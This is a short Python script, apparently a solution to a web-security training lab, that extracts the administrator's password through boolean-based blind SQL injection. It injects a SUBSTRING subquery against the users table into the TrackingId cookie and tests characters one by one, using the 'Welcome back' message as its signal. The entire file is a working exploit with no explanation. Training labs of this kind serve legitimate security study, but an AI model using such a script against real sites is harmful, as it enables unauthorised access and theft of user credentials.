import requests

url = 'https://ac261fed1f5151a3c0ed590000d6003b.web-security-academy.net/'
trackingId = 'JhGf5QQKPyCq5Y1X'

pass_len = 20
admin_pass = ''

while len(admin_pass) < pass_len:
    char = '0'
    valid = False
    while char <= 'z':
        payload = f"{trackingId}' AND (SELECT SUBSTRING(password, {len(admin_pass)+1}, 1) FROM users WHERE username='administrator') = '{char}"
        resp = requests.get(url=url, cookies={'TrackingId': payload})

        if 'Welcome back' in resp.text:
            valid = True
            break

        if char == '9':
            char = 'a'
        else:
            char = chr(ord(char) + 1)

    if not valid:
        print('Failed to find character')
        break
        
    admin_pass += char
    print(f"Found {char}")

print(admin_pass)
